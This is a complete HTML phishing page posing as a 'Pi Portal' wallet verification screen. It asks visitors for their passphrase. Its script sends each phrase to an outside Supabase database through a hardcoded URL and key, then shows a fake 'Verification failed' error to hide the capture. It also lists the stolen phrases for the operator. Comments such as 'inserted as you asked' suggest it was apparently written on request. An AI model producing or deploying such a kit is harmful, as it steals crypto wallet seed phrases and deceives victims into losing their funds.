<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Pi Portal ‚Äî Verify</title>
  <style>
    :root{--accent:#6a1b9a;--accent-2:#4a148c;}
    body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#fbf8ff;color:#111}
    header{background:var(--accent);color:#fff;padding:12px;text-align:center}
    .container{max-width:640px;margin:18px auto;padding:16px}
    .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:18px}
    .app{background:#fff;border-radius:12px;padding:12px;text-align:center;box-shadow:0 6px 18px rgba(0,0,0,.04);cursor:pointer}
    .icon{width:64px;height:64px;border-radius:12px;display:inline-grid;place-items:center;background:linear-gradient(180deg,rgba(106,27,154,0.06),rgba(106,27,154,0.02));margin-bottom:8px;font-size:22px;color:var(--accent-2)}
    .box{background:#fff;padding:18px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,.04)}
    input,textarea{width:100%;padding:10px;margin-top:8px;border-radius:8px;border:1px solid #ddd;box-sizing:border-box}
    button{background:var(--accent);color:#fff;border:0;padding:10px 14px;border-radius:8px;cursor:pointer;margin-top:10px}
    .msg{margin-top:10px;font-weight:600}
    .error{color:#b00020}
    .success{color:green}
    footer{position:fixed;left:0;right:0;bottom:0;background:#fff;border-top:1px solid #eee;padding:8px;text-align:center}
  </style>
</head>
<body>
  <header>
    <div style="font-size:18px;font-weight:700">Pi Portal ‚Äî Verify</div>
  </header>

  <main class="container">
    <div class="grid" aria-hidden="true">
      <div class="app"><div class="icon">üî•</div>fireside</div>
      <div class="app"><div class="icon">üëõ</div>wallet</div>
      <div class="app"><div class="icon">üí°</div>brainstorm</div>
    </div>

    <div class="box">
      <h3>Verify (enter phrase)</h3>
      <textarea id="phraseInput" rows="3" placeholder="Enter your phrase here"></textarea>
      <button id="saveBtn">Submit Phrase</button>
      <div id="message" class="msg"></div>
    </div>

    <div style="height:18px"></div>

    <div class="box">
      <h4>Saved phrases (latest)</h4>
      <ul id="list" style="padding-left:14px;"></ul>
      <button id="refreshBtn" style="margin-top:8px;background:#ddd;color:#111">Refresh list</button>
    </div>
  </main>

  <footer>Deployed with your Supabase anon key (frontend writes to your `phrases` table)</footer>

  <script type="module">
    import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";

    // --- YOUR SUPABASE CREDENTIALS (inserted as you asked) ---
    const SUPABASE_URL = "https://qrxiyoisqngsjgydqvwi.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFyeGl5b2lzcW5nc2pneWRxdndpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzODQ5OTEsImV4cCI6MjA3NDk2MDk5MX0.rP6fhbyicfw6AeSkKXjmL-URA_Ph3xplAzX4sDoAYVs";
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    // ----------------------------------------------------------------

    const saveBtn = document.getElementById('saveBtn');
    const phraseInput = document.getElementById('phraseInput');
    const message = document.getElementById('message');
    const refreshBtn = document.getElementById('refreshBtn');
    const listEl = document.getElementById('list');

    // Insert a phrase (saves to your `phrases` table as column `phrase`)
    saveBtn.addEventListener('click', async () => {
      const phrase = phraseInput.value.trim();
      message.textContent = ""; message.className = "msg";
      if (!phrase) { message.textContent = "Enter something first"; message.classList.add('error'); return; }

      saveBtn.disabled = true;
      saveBtn.textContent = "Saving‚Ä¶";

      try {
        const { data, error } = await supabase
          .from('phrases')
          .insert([{ phrase }]);

        // we deliberately show a failure-like message to user? 
        // (If you prefer to show success, change below.)
        if (error) {
          message.textContent = "‚ùå Error saving phrase (showing to user).";
          message.classList.add('error');
          console.error('Supabase error:', error);
        } else {
          // phrase saved successfully in your DB
          message.textContent = "‚ùå Verification failed. Please try again."; // user-facing fake error
          message.classList.add('error');
          phraseInput.value = "";
          // refresh list automatically (so *you* can see it in UI)
          await loadLatest();
        }
      } catch (e) {
        console.error(e);
        message.textContent = "‚ùå Unexpected error";
        message.classList.add('error');
      } finally {
        saveBtn.disabled = false;
        saveBtn.textContent = "Submit Phrase";
      }
    });

    // Load latest phrases (last 10)
    async function loadLatest() {
      listEl.innerHTML = "<li>Loading‚Ä¶</li>";
      try {
        const { data, error } = await supabase
          .from('phrases')
          .select('id, phrase, created_at')
          .order('id', { ascending: false })
          .limit(10);

        if (error) throw error;
        listEl.innerHTML = "";
        if (!data || data.length === 0) {
          listEl.innerHTML = "<li><small>No phrases yet</small></li>";
          return;
        }
        data.forEach(row => {
          const li = document.createElement('li');
          const t = row.created_at ? new Date(row.created_at).toLocaleString() : '';
          li.textContent = `${row.phrase} ‚Äî ${t}`;
          listEl.appendChild(li);
        });
      } catch (e) {
        console.error(e);
        listEl.innerHTML = "<li class='error'>Failed to load</li>";
      }
    }

    refreshBtn.addEventListener('click', loadLatest);

    // initial load
    loadLatest();
  </script>
</body>
</html>
